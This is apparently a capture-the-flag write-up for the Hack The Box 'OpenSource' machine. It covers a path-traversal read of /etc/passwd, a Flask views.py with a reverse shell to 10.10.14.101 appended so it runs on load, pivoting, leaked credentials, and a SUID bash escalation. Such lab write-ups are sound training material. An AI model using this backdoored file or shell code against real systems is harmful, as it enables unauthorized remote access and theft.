# htb-opensource

# User Access
### LFI

`os.path.join` function has an input of path, if this input equals to an absolute path, the command will throw other inputs and only reads the absolute path.

so getting the following URL gives us `/etc/passwd`

~~~
/uploads/..//etc/passwd
~~~


### Reverse shell

uploaded a `reverseshell.py` into `/app/app/views.py`

~~~
import os
from os import dup2
from subprocess import run

import socket

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))




s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.101",3984)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/sh","-i"])
~~~

Once inside the container realize that the port `3000` is not filtered. so we need **pivoting** and tunnel through the container to see the app running on `3000`


### Pivoting

used this [repo inside the container](https://github.com/BloodhoundAllfather/dembe)
now the webserver is available on my own lap top.

in `users` we see that a user named `dev01` exists.
tried bruteforcing  it with no luck. 

### User Credentials

Started digging in the source code and found [this](https://github.com/mohsenkamini/htb-opensource/commit/a76f8f75f7a4a12b706b0cf9c983796fa1985820)

using the creds to login inside the gitea and found an `id_rsa` which enables login to `dev01@opensource.htb`


# Root Access

Running `linpeas` show `/bin/bash` has `sbit`/`SUID` enabled. running `/bin/bash -p` provides root access.


